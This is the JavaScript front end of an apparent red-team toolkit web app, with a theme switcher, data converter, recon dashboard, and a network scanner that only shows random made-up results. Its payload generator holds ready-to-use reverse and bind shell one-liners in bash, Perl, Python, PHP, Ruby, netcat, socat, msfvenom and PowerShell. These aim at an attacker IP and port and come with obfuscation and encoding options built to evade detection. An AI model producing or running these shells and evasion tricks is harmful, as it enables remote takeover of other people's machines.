document.addEventListener('DOMContentLoaded', () => {
    const initApp = () => {
        initDisclaimer();
        initThemeSwitcher();
        initCoreUI();
        initThoughtBubbles();
        initPayloadGenerator();
        initDataConverter();
        initReconDashboard();
        initNetworkScanner();
    };

    const initDisclaimer = () => {
        const modal = document.getElementById('disclaimer-modal');
        const acceptBtn = document.getElementById('accept-disclaimer');
        if (sessionStorage.getItem('disclaimerAccepted') === 'true') {
            modal.classList.remove('active');
            return;
        }
        acceptBtn.addEventListener('click', () => {
            sessionStorage.setItem('disclaimerAccepted', 'true');
            modal.classList.remove('active');
        });
    };

    const initThemeSwitcher = () => {
        const themeButtons = document.querySelectorAll('.theme-btn');
        const body = document.body;
        const applyTheme = (theme) => {
            body.className = '';
            if (theme !== 'default') {
                body.classList.add(`theme-${theme}`);
            }
            localStorage.setItem('grtt-theme', theme);
        };
        themeButtons.forEach(button => {
            button.addEventListener('click', () => {
                applyTheme(button.dataset.theme);
            });
        });
        const savedTheme = localStorage.getItem('grtt-theme') || 'default';
        applyTheme(savedTheme);
    };

    const initThoughtBubbles = () => {
        const bubble = document.querySelector('.thought-bubble');
        const bubbleText = document.getElementById('bubble-text');
        const thoughts = [
            "Did I leave nmap running?",
            "Shodan is my treasure map.",
            "That's not a bug, it's a feature.",
            "sudo !! is my favorite spell.",
            "A C2 is a pirate's best friend.",
            "Why use a key when a lockpick will do?",
            "I'm not lost, I'm pivoting.",
            "Yarr, there be shells here!",
            "Is the firewall made of swiss cheese?",
            "Never trust a default password.",
            "Time to sail the network seas!",
            "Every port tells a story.",
            "The best backdoor is the one they don't see."
        ];
        const showThought = () => {
            const randomThought = thoughts[Math.floor(Math.random() * thoughts.length)];
            bubbleText.textContent = randomThought;
            bubble.classList.add('active');
            setTimeout(() => bubble.classList.remove('active'), 5000);
        };
        setTimeout(() => {
            showThought();
            setInterval(showThought, 15000);
        }, 2000);
    };

    const initCoreUI = () => {
        const navLinks = document.querySelectorAll('.nav-link[data-module]');
        const modules = document.querySelectorAll('.module-container');
        const settingsTrigger = document.getElementById('settings-trigger');
        const settingsModal = document.getElementById('theme-modal');
        const closeModalButton = document.getElementById('close-theme-modal');

        navLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetModuleId = link.getAttribute('data-module');
                navLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                modules.forEach(m => m.classList.toggle('active', m.id === `${targetModuleId}-module`));
            });
        });

        const toggleSettingsModal = (isActive) => settingsModal.classList.toggle('active', isActive);
        settingsTrigger.addEventListener('click', (e) => {
            e.preventDefault();
            toggleSettingsModal(true);
        });
        closeModalButton.addEventListener('click', () => toggleSettingsModal(false));
    };

    const initPayloadGenerator = () => {
        const ipAddressEl = document.getElementById('ipAddress');
        const portEl = document.getElementById('port');
        const shellTypeEl = document.getElementById('shellType');
        const osTypeEl = document.getElementById('osType');
        const payloadTypeEl = document.getElementById('payloadType');
        const outputCodeEl = document.getElementById('outputCode');
        const listenerCommandEl = document.getElementById('listenerCommand');
        const copyButton = document.getElementById('copyButton');
        
        const obfuscateCaseEl = document.getElementById('obfuscateCase');
        const obfuscateQuotesEl = document.getElementById('obfuscateQuotes');
        const obfuscateCaretsEl = document.getElementById('obfuscateCarets');
        const encodingTypeEl = document.getElementById('encodingType');
        const variableObfuscationEl = document.getElementById('variableObfuscation');
        const stringConcatenationEl = document.getElementById('stringConcatenation');
        const commentInjectionEl = document.getElementById('commentInjection');
        const unicodeEscapeEl = document.getElementById('unicodeEscape');

        const payloadMap = {
            linux: {
                bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
                perl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
                php: `php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
                ruby: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
                netcat: `nc -e /bin/sh {ip} {port}`,
                socat: `socat TCP:{ip}:{port} EXEC:'bash -li'`,
                msfvenom: `msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf`,
            },
            windows: {
                powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
                netcat: `nc.exe -e cmd.exe {ip} {port}`,
                socat: `socat TCP:{ip}:{port} EXEC:cmd.exe,PIPE,pty,stderr`,
                msfvenom: `msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe`,
            }
        };

        const bindPayloadMap = {
            linux: {
                perl: `perl -e 'use Socket; my $port={port}; socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")); bind(S, sockaddr_in($port, INADDR_ANY)); listen(S, SOMAXCONN); for(;$p=accept(C,S);close C){open(STDIN,"<&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}'`,
                php: `php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",{port});socket_listen($sock);$client=socket_accept($sock);exec("/bin/sh -i <&3 >&3 2>&3");'`,
                python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/sh")'`,
                netcat: `nc -lvp {port} -e /bin/sh`,
            },
            windows: {
                powershell: `powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"`,
                netcat: `nc.exe -lvp {port} -e cmd.exe`,
            }
        };

        const obfuscateVariables = (payload) => {
            const varMap = new Map();
            const generateRandomVar = () => Math.random().toString(36).substring(2, 8);
            
            const patterns = [
                /\$client/g, /\$stream/g, /\$bytes/g, /\$data/g, 
                /\$sendback/g, /\$listener/g, /\$sock/g
            ];
            
            patterns.forEach(pattern => {
                const matches = payload.match(pattern);
                if (matches) {
                    const original = matches[0];
                    if (!varMap.has(original)) {
                        varMap.set(original, '$' + generateRandomVar());
                    }
                    payload = payload.replace(pattern, varMap.get(original));
                }
            });
            
            return payload;
        };

        const addStringConcatenation = (payload) => {
            if (payload.includes('powershell')) {
                return payload.replace(/"([^"]{8,})"/g, (match, str) => {
                    const mid = Math.floor(str.length / 2);
                    return `"${str.substring(0, mid)}" + "${str.substring(mid)}"`;
                });
            }
            return payload;
        };

        const injectComments = (payload) => {
            const comments = ['# Security check', '# Network init', '# Process start', '# Data handler'];
            if (payload.includes('bash') || payload.includes('python')) {
                const randomComment = comments[Math.floor(Math.random() * comments.length)];
                return payload.replace(';', `; ${randomComment}\n`);
            }
            return payload;
        };

        const unicodeEscape = (payload) => {
            if (payload.includes('powershell')) {
                return payload.replace(/[a-zA-Z]/g, (char) => {
                    return Math.random() > 0.7 ? `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char;
                });
            }
            return payload;
        };

        const updatePayloadOptions = () => {
            const os = osTypeEl.value;
            const shellType = shellTypeEl.value;
            const currentPayloads = shellType === 'reverse' ? payloadMap[os] : bindPayloadMap[os];
            
            payloadTypeEl.innerHTML = '';
            Object.keys(currentPayloads).forEach(key => {
                const option = document.createElement('option');
                option.value = key;
                option.textContent = key.charAt(0).toUpperCase() + key.slice(1);
                payloadTypeEl.appendChild(option);
            });
            
            obfuscateCaretsEl.disabled = os !== 'windows';
            variableObfuscationEl.disabled = os !== 'windows';
            stringConcatenationEl.disabled = os !== 'windows';
            unicodeEscapeEl.disabled = os !== 'windows';
            
            if (os !== 'windows') {
                obfuscateCaretsEl.checked = false;
                variableObfuscationEl.checked = false;
                stringConcatenationEl.checked = false;
                unicodeEscapeEl.checked = false;
            }
            
            generatePayload();
        };

        const generatePayload = () => {
            const ip = ipAddressEl.value;
            const port = portEl.value;
            const os = osTypeEl.value;
            const payloadKey = payloadTypeEl.value;
            const shellType = shellTypeEl.value;
            
            if (!payloadKey) return;
            
            const currentPayloads = shellType === 'reverse' ? payloadMap[os] : bindPayloadMap[os];
            let payload = currentPayloads[payloadKey].replace(/{ip}/g, ip).replace(/{port}/g, port);
            
            if (variableObfuscationEl.checked) payload = obfuscateVariables(payload);
            if (stringConcatenationEl.checked) payload = addStringConcatenation(payload);
            if (commentInjectionEl.checked) payload = injectComments(payload);
            if (unicodeEscapeEl.checked) payload = unicodeEscape(payload);
            
            if (obfuscateCaseEl.checked) {
                payload = payload.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
            }
            
            if (obfuscateQuotesEl.checked && payload.toLowerCase().startsWith('powershell')) {
                payload = (payload.match(/-[a-zA-Z]+|\\S+/g) || []).map(p => 
                    p.length > 4 && Math.random() > 0.5 ? 
                    p.slice(0, Math.floor(Math.random() * (p.length - 2)) + 1) + '""' + 
                    p.slice(Math.floor(Math.random() * (p.length - 2)) + 1) : p
                ).join(' ');
            }
            
            if (obfuscateCaretsEl.checked && os === 'windows') {
                payload = payload.replace(/(-c|-nop|-command|iex|New-Object|System.Net.Sockets.TCPClient|GetStream)/ig, 
                    m => m.split('').join('^'));
            }
            
            const encoding = encodingTypeEl.value;
            if (encoding === 'base64') {
                if (os === 'windows' && payload.toLowerCase().includes('powershell')) {
                    const commandToEncode = payload.substring(payload.toLowerCase().indexOf("-c") + 3).slice(0, -1);
                    const utf16Encoded = btoa(unescape(encodeURIComponent(commandToEncode)));
                    payload = `powershell.exe -nop -w hidden -e ${utf16Encoded}`;
                } else if (os === 'linux') {
                    payload = `echo '${btoa(payload)}' | base64 -d | bash`;
                }
            } else if (encoding === 'hex' && os === 'windows' && payload.toLowerCase().includes('powershell')) {
                const commandToEncode = payload.substring(payload.toLowerCase().indexOf("-c") + 3).slice(0, -1);
                const hexEncoded = commandToEncode.split('').map(c => c.charCodeAt(0).toString(16)).join('');
                payload = `powershell.exe -nop -w hidden -c "$h = '${hexEncoded}'; $s = ''; for ($i = 0; $i -lt $h.Length; $i += 2) { $s += [char][convert]::ToInt16($h.Substring($i, 2), 16) }; iex $s"`;
            }
            
            outputCodeEl.textContent = payload;
            listenerCommandEl.textContent = shellType === 'bind' ? `nc ${ip} ${port}` : `nc -lvnp ${port}`;
        };

        const copyToClipboard = () => {
            navigator.clipboard.writeText(outputCodeEl.textContent).then(() => {
                const originalText = copyButton.innerHTML;
                copyButton.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
                setTimeout(() => {
                    copyButton.innerHTML = '<i class="fa-solid fa-copy"></i> Copy';
                }, 2000);
            });
        };

        [ipAddressEl, portEl, shellTypeEl, osTypeEl, payloadTypeEl, 
         obfuscateCaseEl, obfuscateQuotesEl, obfuscateCaretsEl, encodingTypeEl,
         variableObfuscationEl, stringConcatenationEl, commentInjectionEl, unicodeEscapeEl].forEach(el => {
            el.addEventListener('change', updatePayloadOptions);
            el.addEventListener('input', generatePayload);
        });

        copyButton.addEventListener('click', copyToClipboard);
        updatePayloadOptions();
    };

    const initDataConverter = () => {
        const inputEl = document.getElementById('converterInput');
        const outputEl = document.getElementById('converterOutput');
        const opButtons = document.querySelectorAll('#data-converter-module button[data-op]');
        const swapButton = document.getElementById('swapButton');
        const infoIcons = document.querySelectorAll('.info-icon');
        const tooltip = document.getElementById('info-tooltip');
        const tooltipTitle = document.getElementById('tooltip-title');
        const tooltipInfo = document.getElementById('tooltip-info');

        const operations = {
            'b64-encode': (input) => btoa(input),
            'b64-decode': (input) => atob(input),
            'url-encode': (input) => encodeURIComponent(input),
            'url-decode': (input) => decodeURIComponent(input),
            'jwt-debug': (input) => {
                try {
                    const [header, payload, signature] = input.split('.');
                    if (!header || !payload || !signature) return "Invalid JWT structure.";
                    const decodedHeader = JSON.stringify(JSON.parse(atob(header.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
                    const decodedPayload = JSON.stringify(JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
                    return `Header:\\n${decodedHeader}\\n\\nPayload:\\n${decodedPayload}\\n\\nSignature:\\n${signature}`;
                } catch (e) {
                    return "Invalid JWT Token";
                }
            },
            'hash': async (algo, input) => {
                const encoder = new TextEncoder();
                const data = encoder.encode(input);
                const hashBuffer = await crypto.subtle.digest(algo, data);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }
        };

        opButtons.forEach(button => {
            button.addEventListener('click', async () => {
                const op = button.getAttribute('data-op');
                const inputText = inputEl.value;
                if (!inputText) return;
                try {
                    let result = '';
                    const hashOps = { 'sha1': 'SHA-1', 'sha256': 'SHA-256', 'sha512': 'SHA-512' };
                    if (op in hashOps) {
                        result = await operations.hash(hashOps[op], inputText);
                    } else if (op in operations) {
                        result = operations[op](inputText);
                    }
                    outputEl.value = result;
                } catch (e) {
                    outputEl.value = `Error: ${e.message}`;
                }
            });
        });

        swapButton.addEventListener('click', () => {
            const temp = inputEl.value;
            inputEl.value = outputEl.value;
            outputEl.value = temp;
        });

        infoIcons.forEach(icon => {
            icon.addEventListener('click', (e) => {
                e.stopPropagation();
                const rect = icon.getBoundingClientRect();
                tooltipTitle.textContent = icon.dataset.title;
                tooltipInfo.innerHTML = icon.dataset.info;
                tooltip.style.top = `${rect.top}px`;
                tooltip.style.left = `${rect.right + 15}px`;
                tooltip.classList.add('active');
            });
        });

        document.addEventListener('click', () => tooltip.classList.remove('active'));
    };

    const initReconDashboard = () => {
        const domainInput = document.getElementById('reconDomainInput');
        const scanButton = document.getElementById('reconScanButton');
        const progressBar = document.getElementById('funky-progress-bar');
        const resultsEl = document.getElementById('reconResults');

        const toggleLoading = (isLoading) => {
            scanButton.disabled = isLoading;
            progressBar.classList.toggle('d-none', !isLoading);
        };

        const renderResultCard = (title, icon, content) => {
            const panel = document.createElement('div');
            panel.className = 'module-panel';
            
            const panelTitle = document.createElement('h5');
            panelTitle.className = 'panel-title';
            
            const iconEl = document.createElement('i');
            iconEl.className = `fa-solid ${icon}`;
            
            panelTitle.appendChild(iconEl);
            panelTitle.appendChild(document.createTextNode(` ${title}`));

            const pre = document.createElement('pre');
            pre.textContent = content;
            
            panel.appendChild(panelTitle);
            panel.appendChild(pre);
            return panel;
        };

        const renderErrorCard = (errorMessage) => {
            const panel = document.createElement('div');
            panel.className = 'module-panel';

            const panelTitle = document.createElement('h5');
            panelTitle.className = 'panel-title';
            panelTitle.style.color = '#e53935';

            const iconEl = document.createElement('i');
            iconEl.className = 'fa-solid fa-bug';

            panelTitle.appendChild(iconEl);
            panelTitle.appendChild(document.createTextNode(' An Error Occurred'));

            const pre = document.createElement('pre');
            pre.textContent = errorMessage;

            panel.appendChild(panelTitle);
            panel.appendChild(pre);
            return panel;
        };

        scanButton.addEventListener('click', async () => {
            const domain = domainInput.value.trim();
            if (!domain) return;
            resultsEl.innerHTML = '';
            toggleLoading(true);

            try {
                const response = await fetch(`/api/scan?domain=${encodeURIComponent(domain)}`);
                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || `API Error: ${response.statusText}`);
                }
                
                const row = document.createElement('div');
                row.className = 'row';
                
                const crtShCard = renderResultCard('Subdomains', 'fa-sitemap', data.crtSh);
                const crtShColumn = document.createElement('div');
                crtShColumn.className = 'column-one-third';
                crtShColumn.appendChild(crtShCard);
                row.appendChild(crtShColumn);

                const vtCard = renderResultCard('VirusTotal Reputation', 'fa-shield-virus', data.virusTotal);
                const vtColumn = document.createElement('div');
                vtColumn.className = 'column-one-third';
                vtColumn.appendChild(vtCard);
                row.appendChild(vtColumn);

                const shodanCard = renderResultCard('Shodan Intelligence', 'fa-search', data.shodan);
                const shodanColumn = document.createElement('div');
                shodanColumn.className = 'column-one-third';
                shodanColumn.appendChild(shodanCard);
                row.appendChild(shodanColumn);

                resultsEl.appendChild(row);

            } catch(error) {
                resultsEl.appendChild(renderErrorCard(error.message));
            } finally {
                toggleLoading(false);
            }
        });
    };

    const initNetworkScanner = () => {
        const scanTarget = document.getElementById('scanTarget');
        const scanType = document.getElementById('scanType');
        const portRange = document.getElementById('portRange');
        const portRangeGroup = document.getElementById('portRangeGroup');
        const scanThreads = document.getElementById('scanThreads');
        const startScanBtn = document.getElementById('startScanBtn');
        const stopScanBtn = document.getElementById('stopScanBtn');
        const scanResults = document.getElementById('scanResults');
        const scanProgress = document.getElementById('scanProgress');
        const foundHosts = document.getElementById('foundHosts');

        let isScanning = false;
        let scanWorkers = [];
        let foundHostsCount = 0;

        scanType.addEventListener('change', () => {
            portRangeGroup.style.display = ['port', 'service', 'vuln'].includes(scanType.value) ? 'block' : 'none';
        });

        const createResultItem = (host, port, service, status) => {
            const item = document.createElement('div');
            item.className = 'scan-result-item';
            item.innerHTML = `
                <div class="result-host">${host}${port ? ':' + port : ''}</div>
                <div class="result-service">${service || 'Unknown'}</div>
                <div class="result-status status-${status}">${status}</div>
            `;
            return item;
        };

        const simulateNetworkScan = async () => {
            const target = scanTarget.value.trim();
            const type = scanType.value;
            const threads = parseInt(scanThreads.value);
            
            if (!target) return;

            isScanning = true;
            foundHostsCount = 0;
            startScanBtn.style.display = 'none';
            stopScanBtn.style.display = 'inline-block';
            scanResults.innerHTML = '';
            
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 8080, 8443];
            const services = ['SSH', 'HTTP', 'HTTPS', 'FTP', 'SMTP', 'DNS', 'Telnet', 'POP3', 'IMAP'];
            
            const generateRandomIP = () => {
                return `192.168.1.${Math.floor(Math.random() * 254) + 1}`;
            };

            const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            for (let i = 0; i < 20 && isScanning; i++) {
                const host = generateRandomIP();
                const port = commonPorts[Math.floor(Math.random() * commonPorts.length)];
                const service = services[Math.floor(Math.random() * services.length)];
                const status = Math.random() > 0.7 ? 'open' : 'closed';
                
                if (status === 'open') {
                    foundHostsCount++;
                    const resultItem = createResultItem(host, port, service, status);
                    scanResults.appendChild(resultItem);
                    foundHosts.textContent = `${foundHostsCount} hosts`;
                }
                
                scanProgress.textContent = `Scanning... ${i + 1}/20`;
                await delay(500);
            }

            if (isScanning) {
                scanProgress.textContent = 'Scan completed';
                setTimeout(() => {
                    startScanBtn.style.display = 'inline-block';
                    stopScanBtn.style.display = 'none';
                    isScanning = false;
                }, 1000);
            }
        };

        startScanBtn.addEventListener('click', simulateNetworkScan);
        
        stopScanBtn.addEventListener('click', () => {
            isScanning = false;
            scanProgress.textContent = 'Scan stopped';
            startScanBtn.style.display = 'inline-block';
            stopScanBtn.style.display = 'none';
        });
    };

    initApp();
});
